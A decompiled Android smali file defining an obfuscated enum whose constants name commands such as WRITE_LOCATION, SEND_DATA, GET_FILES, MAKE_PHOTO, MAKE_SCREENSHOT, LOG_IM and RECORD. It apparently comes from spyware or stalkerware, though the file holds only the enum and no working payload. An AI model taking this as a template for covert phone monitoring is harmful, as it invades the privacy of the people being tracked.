.class public final enum Lhw/utils/ServiceCore$a;
.super Ljava/lang/Enum;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lhw/utils/ServiceCore;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x4019
    name = "a"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Enum<",
        "Lhw/utils/ServiceCore$a;",
        ">;"
    }
.end annotation


# static fields
.field public static final enum b:Lhw/utils/ServiceCore$a;

.field public static final enum c:Lhw/utils/ServiceCore$a;

.field public static final enum d:Lhw/utils/ServiceCore$a;

.field public static final enum e:Lhw/utils/ServiceCore$a;

.field public static final enum f:Lhw/utils/ServiceCore$a;

.field public static final enum g:Lhw/utils/ServiceCore$a;

.field public static final enum h:Lhw/utils/ServiceCore$a;

.field public static final enum i:Lhw/utils/ServiceCore$a;

.field public static final enum j:Lhw/utils/ServiceCore$a;

.field public static final enum k:Lhw/utils/ServiceCore$a;

.field public static final enum l:Lhw/utils/ServiceCore$a;

.field public static final enum m:Lhw/utils/ServiceCore$a;

.field public static final enum n:Lhw/utils/ServiceCore$a;

.field public static final enum o:Lhw/utils/ServiceCore$a;

.field private static final synthetic p:[Lhw/utils/ServiceCore$a;


# direct methods
.method static constructor <clinit>()V
    .locals 17

    new-instance v0, Lhw/utils/ServiceCore$a;

    const-string v1, "INITIALIZE"

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v0, Lhw/utils/ServiceCore$a;->b:Lhw/utils/ServiceCore$a;

    new-instance v1, Lhw/utils/ServiceCore$a;

    const-string v3, "SYNC_EVENTS"

    const/4 v4, 0x1

    invoke-direct {v1, v3, v4}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v1, Lhw/utils/ServiceCore$a;->c:Lhw/utils/ServiceCore$a;

    new-instance v3, Lhw/utils/ServiceCore$a;

    const-string v5, "SYNC_HEAVY_EVENTS"

    const/4 v6, 0x2

    invoke-direct {v3, v5, v6}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v3, Lhw/utils/ServiceCore$a;->d:Lhw/utils/ServiceCore$a;

    new-instance v5, Lhw/utils/ServiceCore$a;

    const-string v7, "WRITE_LOCATION"

    const/4 v8, 0x3

    invoke-direct {v5, v7, v8}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v5, Lhw/utils/ServiceCore$a;->e:Lhw/utils/ServiceCore$a;

    new-instance v7, Lhw/utils/ServiceCore$a;

    const-string v9, "SEND_DATA"

    const/4 v10, 0x4

    invoke-direct {v7, v9, v10}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v7, Lhw/utils/ServiceCore$a;->f:Lhw/utils/ServiceCore$a;

    new-instance v9, Lhw/utils/ServiceCore$a;

    const-string v11, "CHECK_SIM"

    const/4 v12, 0x5

    invoke-direct {v9, v11, v12}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v9, Lhw/utils/ServiceCore$a;->g:Lhw/utils/ServiceCore$a;

    new-instance v11, Lhw/utils/ServiceCore$a;

    const-string v13, "GET_FILES"

    const/4 v14, 0x6

    invoke-direct {v11, v13, v14}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v11, Lhw/utils/ServiceCore$a;->h:Lhw/utils/ServiceCore$a;

    new-instance v13, Lhw/utils/ServiceCore$a;

    const-string v15, "WAITING"

    const/4 v14, 0x7

    invoke-direct {v13, v15, v14}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v13, Lhw/utils/ServiceCore$a;->i:Lhw/utils/ServiceCore$a;

    new-instance v15, Lhw/utils/ServiceCore$a;

    const-string v14, "ENCODE"

    const/16 v12, 0x8

    invoke-direct {v15, v14, v12}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v15, Lhw/utils/ServiceCore$a;->j:Lhw/utils/ServiceCore$a;

    new-instance v14, Lhw/utils/ServiceCore$a;

    const-string v12, "MAKE_PHOTO"

    const/16 v10, 0x9

    invoke-direct {v14, v12, v10}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v14, Lhw/utils/ServiceCore$a;->k:Lhw/utils/ServiceCore$a;

    new-instance v12, Lhw/utils/ServiceCore$a;

    const-string v10, "MAKE_SCREENSHOT"

    const/16 v8, 0xa

    invoke-direct {v12, v10, v8}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v12, Lhw/utils/ServiceCore$a;->l:Lhw/utils/ServiceCore$a;

    new-instance v10, Lhw/utils/ServiceCore$a;

    const-string v8, "OFFHOOK"

    const/16 v6, 0xb

    invoke-direct {v10, v8, v6}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v10, Lhw/utils/ServiceCore$a;->m:Lhw/utils/ServiceCore$a;

    new-instance v8, Lhw/utils/ServiceCore$a;

    const-string v6, "LOG_IM"

    const/16 v4, 0xc

    invoke-direct {v8, v6, v4}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v8, Lhw/utils/ServiceCore$a;->n:Lhw/utils/ServiceCore$a;

    new-instance v6, Lhw/utils/ServiceCore$a;

    const-string v4, "RECORD"

    const/16 v2, 0xd

    invoke-direct {v6, v4, v2}, Lhw/utils/ServiceCore$a;-><init>(Ljava/lang/String;I)V

    sput-object v6, Lhw/utils/ServiceCore$a;->o:Lhw/utils/ServiceCore$a;

    const/16 v4, 0xe

    new-array v4, v4, [Lhw/utils/ServiceCore$a;

    const/16 v16, 0x0

    aput-object v0, v4, v16

    const/4 v0, 0x1

    aput-object v1, v4, v0

    const/4 v0, 0x2

    aput-object v3, v4, v0

    const/4 v0, 0x3

    aput-object v5, v4, v0

    const/4 v0, 0x4

    aput-object v7, v4, v0

    const/4 v0, 0x5

    aput-object v9, v4, v0

    const/4 v0, 0x6

    aput-object v11, v4, v0

    const/4 v0, 0x7

    aput-object v13, v4, v0

    const/16 v0, 0x8

    aput-object v15, v4, v0

    const/16 v0, 0x9

    aput-object v14, v4, v0

    const/16 v0, 0xa

    aput-object v12, v4, v0

    const/16 v0, 0xb

    aput-object v10, v4, v0

    const/16 v0, 0xc

    aput-object v8, v4, v0

    aput-object v6, v4, v2

    sput-object v4, Lhw/utils/ServiceCore$a;->p:[Lhw/utils/ServiceCore$a;

    return-void
.end method

.method private constructor <init>(Ljava/lang/String;I)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    invoke-direct {p0, p1, p2}, Ljava/lang/Enum;-><init>(Ljava/lang/String;I)V

    return-void
.end method

.method public static valueOf(Ljava/lang/String;)Lhw/utils/ServiceCore$a;
    .locals 1

    const-class v0, Lhw/utils/ServiceCore$a;

    invoke-static {v0, p0}, Ljava/lang/Enum;->valueOf(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/Enum;

    move-result-object p0

    check-cast p0, Lhw/utils/ServiceCore$a;

    return-object p0
.end method

.method public static values()[Lhw/utils/ServiceCore$a;
    .locals 1

    sget-object v0, Lhw/utils/ServiceCore$a;->p:[Lhw/utils/ServiceCore$a;

    invoke-virtual {v0}, [Lhw/utils/ServiceCore$a;->clone()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Lhw/utils/ServiceCore$a;

    return-object v0
.end method
